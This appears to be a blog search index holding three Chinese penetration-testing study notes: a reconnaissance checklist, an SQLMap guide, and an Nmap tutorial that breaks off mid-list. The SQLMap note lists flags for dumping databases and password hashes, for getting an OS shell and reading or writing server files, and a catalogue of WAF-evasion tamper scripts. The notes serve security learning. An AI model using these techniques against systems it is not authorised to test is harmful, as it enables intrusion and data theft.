<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>信息收集</title>
    <url>/2019/12/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>在渗透测试中我们常常是上来就开始搞事情不愿意去对目标的网站或服务做过多的信息收集，这有时会导致我们在特定的时间找不到相应的突破点，而这里就体现到了我们信息收集的意义与重要性，在我自己看来我们久攻不下的网站并不是我们能丽不够而是我们信息收集的不够，所以信息收集在我看来是整个渗透测试中最重要的一步也是非常有必要去做的一步</p>
<a id="more"></a>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">Whois信息</span><br><span class="line">	域名信息</span><br><span class="line">	备案信息</span><br><span class="line">	注册商</span><br><span class="line">	DNS信息</span><br><span class="line">	旁站信息</span><br><span class="line">	真实IP     <span class="comment">//通过多地ping查看</span></span><br><span class="line">	whois反查</span><br><span class="line">		邮箱反查域名</span><br><span class="line">		联系人反查域名</span><br><span class="line">	注册人信息</span><br><span class="line">		邮箱</span><br><span class="line">		电话</span><br><span class="line">		购买时间</span><br><span class="line">	在线Whois查询网站</span><br><span class="line">		爱站工具网 	<span class="string">https:</span><span class="comment">//whois.aizhan.com/</span></span><br><span class="line">		站长之家   	<span class="string">http:</span><span class="comment">//whois.chinaz.com/</span></span><br><span class="line">		微步       	<span class="string">https:</span><span class="comment">//x.threatbook.cn/</span></span><br><span class="line">		国外的		<span class="string">https:</span><span class="comment">//who.is/</span></span><br><span class="line">指纹信息</span><br><span class="line">	操作系统			Linux<span class="regexp">/Windows	/</span>/可通过url大小写判断</span><br><span class="line">	中间价			Apache<span class="regexp">/Nginx/</span>IIS等</span><br><span class="line">	数据库			Mysql<span class="regexp">/Mssql/</span>Access等</span><br><span class="line">	编程语言			PHP<span class="regexp">/ASP/</span>ASPX/JSP等</span><br><span class="line">	前端框架			jQuery<span class="regexp">/BootStrap/</span>Vue/React等</span><br><span class="line">	Web容器服务器	Tomcat<span class="regexp">/Jboss/</span>Weblogic等</span><br><span class="line">	后端框架			CMS</span><br><span class="line">	在线指纹识别网站</span><br><span class="line">		云悉			<span class="string">http:</span><span class="comment">//www.yunsee.cn/</span></span><br><span class="line">		bugscaner 	<span class="string">http:</span><span class="comment">//whatweb.bugscaner.com/</span></span><br><span class="line">		WhatWeb		<span class="string">https:</span><span class="comment">//whatweb.net/</span></span><br><span class="line">	本地工具</span><br><span class="line">		whatweb</span><br><span class="line">敏感信息</span><br><span class="line">	敏感目录</span><br><span class="line">	敏感文件</span><br><span class="line">		robots.txt</span><br><span class="line">		crossdomain.xml</span><br><span class="line">		sitemap.xml</span><br><span class="line">		xx.tar.gz</span><br><span class="line">		xx.bak</span><br><span class="line">		等</span><br><span class="line">	本地工具</span><br><span class="line">		dirsearch.py</span><br><span class="line">		御剑</span><br><span class="line">		DirBuster</span><br><span class="line">		wwwsacn</span><br><span class="line">		Spinder.py(轻量级快速单文件目录后台扫描)</span><br><span class="line">		Sensitivefilescan(轻量级快速单文件目录后台扫描）</span><br><span class="line">		Weakfilescan(轻量级快速单文件目录后台扫描)</span><br><span class="line">	搜索引擎</span><br><span class="line">		site----指定域名</span><br><span class="line">		inurl----URL中存在关键字的网页</span><br><span class="line">		intext----网页正文中关键字</span><br><span class="line">		intitle----搜索到的网页标题包含关键字</span><br><span class="line">		info----查找指定站点的一些基本信息</span><br><span class="line"></span><br><span class="line">C段信息</span><br><span class="line">子域名信息</span><br><span class="line">	使用工具</span><br><span class="line">端口信息</span><br><span class="line">	使用工具Nmap</span><br><span class="line">WEF信息</span><br><span class="line">	使用工具</span><br><span class="line">		wafw00f</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMap</title>
    <url>/2019/12/24/SQLMap/</url>
    <content><![CDATA[<h1 id="SQlmap详解"><a href="#SQlmap详解" class="headerlink" title="SQlmap详解"></a>SQlmap详解</h1><h2 id="SQLMap概论"><a href="#SQLMap概论" class="headerlink" title="SQLMap概论"></a>SQLMap概论</h2><h3 id="5种SQL注入技术"><a href="#5种SQL注入技术" class="headerlink" title="5种SQL注入技术"></a>5种SQL注入技术</h3><p>布尔类型的盲注：返回页面判断条件真假的注入<br>基于时间的盲注：即不根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否执行（页面返回时间是否增加）来判断<br>基于报错注入：页面会返回错误信息，或者把注入语句的结果直接返回页面种<br>联合查询注入：在使用Union的情况下的注入<br>堆查询注入：同时执行多条语句时的注入</p>
<a id="more"></a>
<h3 id="支持的数据库种类"><a href="#支持的数据库种类" class="headerlink" title="支持的数据库种类"></a>支持的数据库种类</h3><p>MySQL<br>Oracle<br>PostgreSQL<br>MSSQLSever<br>Microsoft Access<br>IBM DB2<br>SQLite<br>Firebird<br>Sybase<br>SAP MaxDB</p>
<h3 id="SQLMap的强大功能"><a href="#SQLMap的强大功能" class="headerlink" title="SQLMap的强大功能"></a>SQLMap的强大功能</h3><p>数据库指纹识别<br>数据库枚举<br>数据库提取<br>访问目标文件系统，并在获取完全的操作权限时实行任意命令</p>
<h2 id="SQLMap入门："><a href="#SQLMap入门：" class="headerlink" title="SQLMap入门："></a>SQLMap入门：</h2><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">判断是否存在注入</span><br><span class="line">	-<span class="ruby">u <span class="string">"URL"</span></span></span><br><span class="line"><span class="ruby">判断文本中的请求是否存在注入</span></span><br><span class="line"><span class="ruby">	-r</span></span><br><span class="line"><span class="ruby">查询当前用户下所有数据库</span></span><br><span class="line"><span class="ruby">	--dbs </span></span><br><span class="line"><span class="ruby">查询当前用户下所有数据库</span></span><br><span class="line"><span class="ruby">	-D pram   指定某一个具体的数据库</span></span><br><span class="line"><span class="ruby">获取数据库的表名</span></span><br><span class="line"><span class="ruby">	--tables	某表名继续查询</span></span><br><span class="line"><span class="ruby">获取表中的字段</span></span><br><span class="line"><span class="ruby">	--columns</span></span><br><span class="line"><span class="ruby">获取字段内容</span></span><br><span class="line"><span class="ruby">	--dump	查询完字段名后，获取字段中具体数据信息</span></span><br><span class="line"><span class="ruby">获取数据库的所有用户</span></span><br><span class="line"><span class="ruby">	--users	列出所有管理员用户</span></span><br><span class="line"><span class="ruby">获取数据库用户的密码</span></span><br><span class="line"><span class="ruby">	--passwords	列出数据库用户的密码</span></span><br><span class="line"><span class="ruby">获取当前网站数据库名称</span></span><br><span class="line"><span class="ruby">	--current-db</span></span><br><span class="line"><span class="ruby">获取当前网站数据库的用户名称</span></span><br><span class="line"><span class="ruby">	--current-user</span></span><br></pre></td></tr></table></figure>
<h2 id="SQLMap进阶：参数讲解"><a href="#SQLMap进阶：参数讲解" class="headerlink" title="SQLMap进阶：参数讲解"></a>SQLMap进阶：参数讲解</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--leve 5：探测等级</span></span><br><span class="line">	等级越高速度越慢，Payload也越多</span><br><span class="line">	参数会影响测试的注入点</span><br><span class="line">		所有参数都会测试<span class="keyword">GET</span>和POST</span><br><span class="line">		leve2 开始测试HTTP cookie</span><br><span class="line">		leve3开始测试HTTP <span class="keyword">User</span>-Agent/Referer头</span><br><span class="line">		为了保证全面性建议用高<span class="keyword">level</span></span><br><span class="line"><span class="comment">--is-dba：当前用户是否为管理权限</span></span><br><span class="line"><span class="comment">--role：列出数据库管理员角色</span></span><br><span class="line">	只针对Oracle数据库</span><br><span class="line">		-U指定想看哪个用户的角色</span><br><span class="line"><span class="comment">--referer：HTTP Referer头</span></span><br><span class="line">	SQLMap可伪造HTTP中的referer，<span class="comment">--level为3或3以上时候会尝试对referer注入。可使用referer命令进行欺骗</span></span><br><span class="line"><span class="comment">--sql-shell:运行自定义SQL语句</span></span><br><span class="line">	用于执行指定的<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="comment">--os-cmd，--os-shell：运行任意操作系统命令</span></span><br><span class="line">	<span class="comment">--os-shell：模拟一个真实的shell，输入想执行的命令。当不能执行多语句时（如PHP或ASP的后端数据库为MySQL），仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门</span></span><br><span class="line">		想执行改参数，需要有数据库管理员权限<span class="comment">--is-dba为True</span></span><br><span class="line"><span class="comment">--file-read：从数据库服务器中读取文件</span></span><br><span class="line">	用于读取执行文件，当数据库为MySQL，PostgreSQL或MSSQL Sever并当前用户权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</span><br><span class="line">		sqlmap.py -u "URL"   <span class="comment">--file-read "C:/example.exe" -v 1 </span></span><br><span class="line"><span class="comment">--file-write --file-dest:上传文件到数据库服务器中</span></span><br><span class="line">	该命令用于写入本地文件到服务器中，当数据库为MySQL，PostgreSQL或MSSQL Sever并当前用户权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</span><br></pre></td></tr></table></figure>
<h2 id="SQLMAP自带脚本绕过脚本tamper的讲解"><a href="#SQLMAP自带脚本绕过脚本tamper的讲解" class="headerlink" title="SQLMAP自带脚本绕过脚本tamper的讲解"></a>SQLMAP自带脚本绕过脚本tamper的讲解</h2><p>默认情况下使用CHAR()函数防止出现单引号，没有对注入的数据进行修改<br>###–tamper参数对数据做修改来绕过WAF等设备<br>大部分脚本主要是用正则模块替换攻击在和字符编码的方式尝试绕过WAF检测规则<br>–tamper  “模块名”<br>–identify-waf:检测网站是否有安全防护(WAF/IDS/IPS)<br>tamper脚本</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">apostrophemask.<span class="keyword">py</span></span><br><span class="line">	将引号替换成UTF-<span class="number">8</span>，用于过滤单引号</span><br><span class="line">base64encode.<span class="keyword">py</span></span><br><span class="line">	替换为base64编码</span><br><span class="line">multiplespaces.<span class="keyword">py</span></span><br><span class="line">	围绕SQL关键字添加多个空格</span><br><span class="line">sqpce2plus.<span class="keyword">py</span></span><br><span class="line">	用+代替空格</span><br><span class="line">nonrecursivereplacement.<span class="keyword">py</span></span><br><span class="line">	作为双重查询语句，用双重语句替代定义的SQL关键字（适用于非常弱的自定义过滤器，例如将SELECT替换为空）。（selselectect）</span><br><span class="line">space2randomblank.<span class="keyword">py</span></span><br><span class="line">	将空格替换为其他有效字符</span><br><span class="line">unionalltounion.<span class="keyword">py</span></span><br><span class="line">	将union <span class="keyword">all</span> select 替换成union select</span><br><span class="line">securesphere.<span class="keyword">py</span></span><br><span class="line">	追加特制的字符串</span><br><span class="line">spce2hash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为#号，并添加一个随机字符串和换行符。</span><br><span class="line">space2mssqlbank.<span class="keyword">py</span>(mssql)</span><br><span class="line">	将空格替换为其他符号</span><br><span class="line">space2mssqlhash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为#，并添加一个换行符</span><br><span class="line">between.<span class="keyword">py</span></span><br><span class="line">	用not between <span class="number">0</span> <span class="built_in">and</span>   替换大于号（&gt;）,用between <span class="built_in">and</span> 替换等号（=）</span><br><span class="line">percentage.<span class="keyword">py</span></span><br><span class="line">	ASP允许在每个字符前面添加一个%号</span><br><span class="line">sp_password.<span class="keyword">py</span></span><br><span class="line">	从DBMS日志的自动模糊处理的有效载荷中追加sp_password</span><br><span class="line">charencode.<span class="keyword">py</span></span><br><span class="line">	对给定的Payload全部字符使用URL编码（不处理已编码的字符）</span><br><span class="line">randomcase.<span class="keyword">py</span></span><br><span class="line">	随机大小写</span><br><span class="line">charunicodeencode.<span class="keyword">py</span></span><br><span class="line">	字符串unicode编码</span><br><span class="line">space2comment.<span class="keyword">py</span></span><br><span class="line">	将空格替换为/**/</span><br><span class="line">equaltolike.<span class="keyword">py</span></span><br><span class="line">	将等号替换为like</span><br><span class="line">greatest.<span class="keyword">py</span></span><br><span class="line">	绕过对“&gt;”的过滤，用greatest替换大于号</span><br><span class="line">ifnull2ifisnull.<span class="keyword">py</span></span><br><span class="line">	绕过对ifull的过滤，替换类似ifnull(A,B)为IF(ISNULL(A),B,A)</span><br><span class="line">modsecurityversioned.<span class="keyword">py</span></span><br><span class="line">	过滤空格，使用MySQL内联注释的方式进行注入</span><br><span class="line">space2mysqlblank.<span class="keyword">py</span></span><br><span class="line">	将空格替换为其他空白符号（适用于MySQL）</span><br><span class="line">modsecurityzeroversioned.<span class="keyword">py</span></span><br><span class="line">	使用MySQL内联注释的方式（/*！<span class="number">0000</span>*/）进行注入</span><br><span class="line">space2mysqldash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为--，并添加一个换行符</span><br><span class="line">bluecoat.<span class="keyword">py</span></span><br><span class="line">	在SQL语句之后用有效的随机空白符替换空格符，随后用like替换等于号</span><br><span class="line">versionedkeywords.<span class="keyword">py</span></span><br><span class="line">	注释绕过</span><br><span class="line">halfversionedmorekeywords.<span class="keyword">py</span></span><br><span class="line">	当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释</span><br><span class="line">space2morehash.<span class="keyword">py</span></span><br><span class="line">	将空格替换为#号，并添加一个随机字符串和换行符</span><br><span class="line">apostrophenullencode.<span class="keyword">py</span></span><br><span class="line">	用非法双字节unicode字符替换单引号</span><br><span class="line">appendnullbyte.<span class="keyword">py</span></span><br><span class="line">	在有效负荷的结束位置加载零字节字符编码</span><br><span class="line">chardoubleencode.<span class="keyword">py</span></span><br><span class="line">	对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">unmagicquotes.<span class="keyword">py</span></span><br><span class="line">	用于一个多字节组合（%<span class="keyword">bf</span>%<span class="number">27</span>）和末尾通用注释一起替换空格</span><br><span class="line">randomcomments.<span class="keyword">py</span></span><br><span class="line">	用/**/分割SQL关键字</span><br></pre></td></tr></table></figure>
<pre><code>建议：在学习使用自带的tamper的同时，最好掌握tamper的编写规则</code></pre>]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap</title>
    <url>/2019/12/24/Nmap/</url>
    <content><![CDATA[<h1 id="Nmap介绍与安装"><a href="#Nmap介绍与安装" class="headerlink" title="Nmap介绍与安装"></a>Nmap介绍与安装</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Nmap是一款开源、免费的网络探测、安全审计的工具。</p>
<a id="more"></a>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Nmap官网 ： <a href="https://nmap.org/" target="_blank" rel="noopener">https://nmap.org/</a></p>
<h3 id="windows下安装Nmap"><a href="#windows下安装Nmap" class="headerlink" title="windows下安装Nmap"></a>windows下安装Nmap</h3><p>进入Nmap官网点击exe文件下载<br>双击exe文件安装（无脑下一步，修改文件安装路径）</p>
<h3 id="linux下安装Nmap"><a href="#linux下安装Nmap" class="headerlink" title="linux下安装Nmap"></a>linux下安装Nmap</h3><p>进入Nmap官网复制以下命令进行安装<br>rpm -vhU <a href="https://nmap.org/dist/nmap-7.80-1.x86_64.rpm" target="_blank" rel="noopener">https://nmap.org/dist/nmap-7.80-1.x86_64.rpm</a></p>
<h2 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h2><h3 id="Nmap列举远程计算机开放的端口"><a href="#Nmap列举远程计算机开放的端口" class="headerlink" title="Nmap列举远程计算机开放的端口"></a>Nmap列举远程计算机开放的端口</h3><p>以下扫描全部使用kali命令行执行</p>
<h4 id="基础扫描端口"><a href="#基础扫描端口" class="headerlink" title="基础扫描端口"></a>基础扫描端口</h4><figure class="highlight plain"><figcaption><span>192.168.1.104```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### -Pn绕过防火墙</span><br><span class="line">对于已经知道主机存活或者防火墙开启的机器，可以使用-Pn参数来停止探测之前的ICMP请求。已达到不触发防火墙安全机制。</span><br><span class="line">&#96;&#96;&#96;nmap -Pn 192.168.1.104</span><br></pre></td></tr></table></figure>
<h4 id="p扫描指定端口范围"><a href="#p扫描指定端口范围" class="headerlink" title="-p扫描指定端口范围"></a>-p扫描指定端口范围</h4><p>对于默认的端口范围，并不能满足日常工作需要。可以使用-p m-n来指定探测端口范围为m-n之间的所有端口。</p>
<figure class="highlight plain"><figcaption><span>-p 1-10000 192.168.1.104```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### 端口状态</span><br></pre></td></tr></table></figure>
<p>-Open 表示端口处于开放状态；<br>-Closed 表示端口处于关闭状态；<br>-Filterd 表示端口处于过滤无法收到返回的probe，但是无法确认；<br>-Opend/UnFilterd 表示端口处于开放或者是未过滤状态；<br>-Closed/UnFinished 表示端口处于关闭或者未过滤状态；</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">#### Nmap扫描技术查看</span><br><span class="line">在命令行中，输入nmap -h 来查看nmap自带的帮助信息。</span><br><span class="line"></span><br><span class="line">### Nmap识别目标机器上的服务指纹</span><br><span class="line">#### 服务指纹</span><br><span class="line">为了确保有一个成功的渗透测试或网络设备监控，必须需要知道目标系统中服务的指纹信息。服务指纹信息包括服务端口、服务名和版本等。</span><br><span class="line">通过分析目标往Nmap发送的数据包中某些协议标记、选项和数据，我们可以推断发送这些数据报的操作系统等。</span><br><span class="line">Nmap通过向目标主机发送多个UDP与TCP数据包并分析其响应来进行操作系统指纹识别工作。</span><br><span class="line">#### Nmap识别服务指纹</span><br><span class="line">使用命令 nmap -sV IP 地址 来识别目标机器的服务信息。</span><br><span class="line">```nmap -sV <span class="number">192.168</span><span class="number">.248</span><span class="number">.129</span></span><br></pre></td></tr></table></figure>
<h4 id="Nmap侵略性的探测"><a href="#Nmap侵略性的探测" class="headerlink" title="Nmap侵略性的探测"></a>Nmap侵略性的探测</h4><p>使用命令 nmap -A -v -T4 ip地址 来探测目标机器的操作系统、服务等信息</p>
<figure class="highlight plain"><figcaption><span>-A -v -T4 192.168.248.129```</span></figcaption><table><tr><td class="code"><pre><span class="line">使用nmap -sC -sV -O IP地址 来探测目标机器的操作系统、服务等信息。</span><br><span class="line">其中sC参数表示使用Nmap脚本进行探测，sV表示探测目标机器上的服务信息，O表示探测目标机器的操作系统信息。-sC：equivalent to –script&#x3D;default</span><br><span class="line">&#96;&#96;&#96;nmap -sC -sV -O 192.168.248.129</span><br></pre></td></tr></table></figure>
<h3 id="Nmap发现局域网中存活主机"><a href="#Nmap发现局域网中存活主机" class="headerlink" title="Nmap发现局域网中存活主机"></a>Nmap发现局域网中存活主机</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>一个局域网中肯定是连接着多台设备，那么我们如何获取哪些设备正在开机状态呢？<br>使用ping ip 地址进行探测，但是如果一个网络很大的情况下，这样的手工探测显得很费劲。<br>可以使用不同的工具来进行批量探测，在探测之间需要明白CIDR的含义。<br>CIDR CIDR（无类别域间路由，Classless Inter-Domain Routing），可以快速表示一个网络。<br>比如：192.168.1.1/24 表示在192.168.1.1-192.168.1.255之间的所有主机IP地址。</p>
<h4 id="Nmap主机发现"><a href="#Nmap主机发现" class="headerlink" title="Nmap主机发现"></a>Nmap主机发现</h4><p>使用Nmap命令：nmap -sP CIDR 对该网络中所有主机进行ping扫描，以探测主机存活性。扫描过程中使用了TCP SYN扫描、ICMP echo Request来探测主机存活。</p>
<figure class="highlight plain"><figcaption><span>-sP 192.168.248.1/24```</span></figcaption><table><tr><td class="code"><pre><span class="line">使用Nmap命令：nmap -sn CIDR 对该网络中所有主机进行ping扫描，以探测主机存活性</span><br><span class="line">&#96;&#96;&#96;nmap -sn 192.168.248.1&#x2F;24</span><br></pre></td></tr></table></figure>
<h4 id="Nmap主机发现，结果输出"><a href="#Nmap主机发现，结果输出" class="headerlink" title="Nmap主机发现，结果输出"></a>Nmap主机发现，结果输出</h4><p>使用Nmap命令：nmap -sn CIDR -oX text.xml 对该网络中所有主机进行ping扫描，以探测主机存活性。<br>同时将结果输出到text.xml文件中，以便后续使用。</p>
<figure class="highlight plain"><figcaption><span>-sn 192.168.248.1/24 -oX text.xml```</span></figcaption><table><tr><td class="code"><pre><span class="line">### Nmap端口探测技巧</span><br><span class="line">#### 对某个端口进行探测</span><br><span class="line">&#96;&#96;&#96;nmap -p 80 192.168.248.129</span><br></pre></td></tr></table></figure>
<h4 id="对某几个端口进行探测"><a href="#对某几个端口进行探测" class="headerlink" title="对某几个端口进行探测"></a>对某几个端口进行探测</h4><figure class="highlight plain"><figcaption><span>-p 80,139 192.168.248.129```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### 对某个范围端口进行探测</span><br><span class="line">&#96;&#96;&#96;nmap -p 1-100 192.168.248.129</span><br></pre></td></tr></table></figure>
<h4 id="对所有端口进行探测"><a href="#对所有端口进行探测" class="headerlink" title="对所有端口进行探测"></a>对所有端口进行探测</h4><figure class="highlight plain"><figcaption><span>-p - 192.168.248.129```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### 指定协议探测端口</span><br><span class="line">&#96;&#96;&#96;nmap -p T:25,U:53 192.168.248.129</span><br></pre></td></tr></table></figure>
<h4 id="通过协议名来扫描端口"><a href="#通过协议名来扫描端口" class="headerlink" title="通过协议名来扫描端口"></a>通过协议名来扫描端口</h4><figure class="highlight plain"><figcaption><span>-p http 192.168.248.129```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### 通过名称范围扫描</span><br><span class="line">&#96;&#96;&#96;nmap -p h* 192.168.248.129</span><br></pre></td></tr></table></figure>
<h4 id="扫描注册在nmap中的端口"><a href="#扫描注册在nmap中的端口" class="headerlink" title="扫描注册在nmap中的端口"></a>扫描注册在nmap中的端口</h4><figure class="highlight plain"><figcaption><span>-p [1-65535] 192.168.248.129```</span></figcaption><table><tr><td class="code"><pre><span class="line">### Nmap NSE脚本使用</span><br><span class="line">#### NSE介绍</span><br><span class="line">NSE（Namp Script Engine）Nmap脚本引擎，内置很多可以用来扫描的、针对特定任务的脚本。通过NSE可以不断拓展Nmap的扫描策略，加强Nmap的功能。</span><br><span class="line">Nmap中使用 –script 参数来指定调用的脚本，并且脚本存储在Nmap安装路径下的script文件夹下，对于kali Linux存储在&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;script&#x2F;下。</span><br><span class="line">#### NSE使用</span><br><span class="line">使用Nmap探测 Web服务的title信息。 nmap –script 脚本名称 目标</span><br><span class="line">&#96;&#96;&#96;nmap --script http-title 192.168.248.129</span><br></pre></td></tr></table></figure>
<p>以上通过Nmap使用http-title脚本进行探测，还可以使用其他脚本进行探测。目前为止可以用的有589个脚本，每个脚本都有其独特的作用。<br>使用Nmap探测http服务的http头 nmap –script http-headers 目标</p>
<figure class="highlight plain"><figcaption><span>--script http-headers 192.168.248.129```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### NSE分类使用</span><br><span class="line">对于目标使用多个分类脚本进行探测，可以更快的找到目标的信息与弱点。</span><br><span class="line">使用Nmap中漏洞分类脚本进行探测，使用命令如下：</span><br><span class="line">nmap -sV –script vuln 目标</span><br><span class="line">&#96;&#96;&#96;nmap -sV --script vuln 192.168.248.129</span><br></pre></td></tr></table></figure>
<p>使用Nmap中发现和版本信息分类进行探测，使用命令如下：<br>nmap -sV –script=”version,discovery” 目标</p>
<figure class="highlight plain"><figcaption><span>-sV --script</span></figcaption><table><tr><td class="code"><pre><span class="line">使用Nmap除了exploit分类之外的其他分类进行探测，使用命令如下：</span><br><span class="line">nmap -sV –script&#x3D;”not exploit” 目标</span><br><span class="line">使用Nmap中http*的脚本，但是除了（http-brute和http-slowlors）,使用命令如下：</span><br><span class="line">nmap -sV –script&#x3D;”(http*) and not (http-slowlors and http-brute)” 目标</span><br><span class="line">&#96;&#96;&#96;nmap -sV --script &quot;(http*) and not (http-slowlors and http-brute)&quot; 192.168.248.129</span><br></pre></td></tr></table></figure>
<h3 id="NSE调试功能使用"><a href="#NSE调试功能使用" class="headerlink" title="NSE调试功能使用"></a>NSE调试功能使用</h3><p>使用Nmap中exploit，但是在使用的同时开启调试模式。使用命令如下：<br>nmap -sV –script exploit -d 3 –script-trace 目标<br>注意：-d（debug 范围0-9）</p>
<figure class="highlight plain"><figcaption><span>-sV --script exploit -d 3 --script-trace 192.168.248.129```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### NSE参数的使用</span><br><span class="line">使用nmap的http-title脚本，并且指定使用对应的User-Agent。命令如下：</span><br><span class="line">nmap -sV –script http-title –script-args http.useragent&#x3D;”Mozilla 999″ 目标</span><br><span class="line">&#96;&#96;&#96;nmap -sV --script http-title --script-args&#x3D;&quot;http.useragent&#x3D;&quot;Mozilla 999&quot;&quot; 192.168.248.129</span><br></pre></td></tr></table></figure>
<h4 id="NSE更新"><a href="#NSE更新" class="headerlink" title="NSE更新"></a>NSE更新</h4><figure class="highlight plain"><figcaption><span>--script-updatedb```</span></figcaption><table><tr><td class="code"><pre><span class="line">#### NSE脚本分类</span><br><span class="line">可以查看 https:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;</span><br><span class="line">### Nmap使用特定网卡进行探测</span><br><span class="line">#### 情景介绍</span><br><span class="line">Nmap是一款可拓展性强的工具，并且有些NSE脚本支持嗅探。但是这种功能需要网卡支持混杂模式才可以。或者当计算机上有两张网卡，并且两张网卡对应的不同网络。</span><br><span class="line">Nmap中提供了切换使用特定网卡进行探测的参数 -e</span><br><span class="line">#### 指定网卡进行探测</span><br><span class="line">使用Nmap命令行：nmap -e interface CIDR</span><br><span class="line">&#96;&#96;&#96;nmap -e eth0 192.168.248.1&#x2F;24</span><br></pre></td></tr></table></figure>
<h3 id="Nmap对比扫描结果ndiff"><a href="#Nmap对比扫描结果ndiff" class="headerlink" title="Nmap对比扫描结果ndiff"></a>Nmap对比扫描结果ndiff</h3><h4 id="情景介绍"><a href="#情景介绍" class="headerlink" title="情景介绍"></a>情景介绍</h4><p>对某个网络进行探测的时候，有可能之前有探测过的结果，现在探测过后，需要对之前的结果与现在的结果对比，找到两次不同点。<br>监视网络变化，达到网络监控的目的。</p>
<h4 id="工具ndiff介绍"><a href="#工具ndiff介绍" class="headerlink" title="工具ndiff介绍"></a>工具ndiff介绍</h4><p>在Nmap整个过程中，除了主要的Nmap工具之外，还包括很多其他的工具。如接下来要使用到的ndiff工具。</p>
<figure class="highlight plain"><figcaption><span>-A -v -T4 192.168.248.129 -oX 1.xml```</span></figcaption><table><tr><td class="code"><pre><span class="line">制作两个不一样的xml文件</span><br><span class="line">&#96;&#96;&#96;nmap -A -v -T4 192.168.248.129 -oX 2.xml</span><br></pre></td></tr></table></figure>
<p>2.7.3 比较Nmap两次扫描结果<br>使用命令：</p>
<figure class="highlight plain"><figcaption><span>1.xml 2.xml (1.xml和2.xml是Nmap扫描结果的xml格式。-oX)```</span></figcaption><table><tr><td class="code"><pre><span class="line">### 可视化Nmap的使用</span><br><span class="line">#### 可视化Nmap（Zenmap）介绍</span><br><span class="line">Nmap命令参数复杂，组合类型多种多样，如果使用命令行类型的Nmap需要记忆大量命令，对于网络管理员和渗透测试者都是一项艰巨的任务。但是如果使用可视化Nmap（Zenmap），那么就不存在这样的问题。</span><br><span class="line">在安装Nmap的同时，会自动安装可视化Nmap（Zenmap），可以在安装目录中找到。</span><br><span class="line">#### Zenmap的使用</span><br><span class="line">配置扫描策略</span><br><span class="line"></span><br><span class="line">### 选项摘要</span><br></pre></td></tr></table></figure>
<p>主机发现：<br>  -A：启用操作系统检测，版本检测，脚本扫描和跟踪路由<br>  -sn：Ping扫描 - 禁用端口扫描<br>  -Pn：将所有主机视为在线 - 跳过主机发现(无 ping)<br>  -PS / PA / PU / PY [端口列表]：给定端口的TCP SYN / ACK，UDP或SCTP发现<br>  -PE / PP / PM：ICMP回送，时间戳和网络掩码请求发现探测<br>  -PO [协议列表]：IP协议Ping<br>  –dns-servers &lt;serv1 [，serv2]，…&gt;：指定自定义DNS服务器<br>  –system-dns：使用OS的DNS解析器<br>  –traceroute：每个主机的跟踪跳转路径<br>扫描技术：<br>  -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描<br>  -sU：UDP扫描<br>  -sN / sF / sX：TCP Null，FIN和Xmas扫描<br>  –scanflags <flags>：自定义TCP扫描标志<br>  -sI &lt;zombie host [：probeport]&gt;：空闲扫描<br>  -sY / sZ：SCTP INIT / COOKIE-ECHO扫描<br>  -sO：IP协议扫描<br>  -b &lt;FTP中继主机&gt;：FTP反弹扫描<br>端口扫描：<br>  -p &lt;端口范围&gt;：仅扫描指定的端口<br>    例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9<br>  –exclude-ports &lt;端口范围&gt;：从扫描中排除指定的端口<br>  -F：快速模式 - 扫描比默认扫描更少的端口<br>  -r：连续扫描端口 - 不要随机化<br>  –top-ports <number>：扫描<number>最常见的端口<br>服务/版本检测：<br>  -sV：探测开放端口以确定服务/版本信息<br>  –version-intensity <level>：从0（亮）到9（尝试所有探针）设置<br>  –version-light：限制最可能的探针（强度2）<br>  –version-all：尝试每一个探针（强度9）<br>  –version-trace：显示详细的版本扫描活动（用于调试）<br>脚本扫描：<br>  -sC：相当于–script = default<br>  –script = <Lua scripts>：<Lua scripts>是逗号分隔的列表目录，脚本文件或脚本类别<br>  –script-args = &lt;n1 = v1，[n2 = v2，…]&gt;：为脚本提供参数<br>  –script-args-file = filename：在文件中提供NSE脚本args<br>  –script-trace：显示发送和接收的所有数据<br>  –script-updatedb：更新脚本数据库。<br>  –script-help = <Lua scripts>：显示有关脚本的帮助。<br>操作系统检测：<br>  -O：启用OS检测<br>  –osscan-limit：将OS检测限制为有希望的目标<br>  –osscan-guess：更积极地猜测操作系统<br>时间和性能：<br>  采用<time>的选项以秒为单位，或追加’ms’（毫秒），<br>  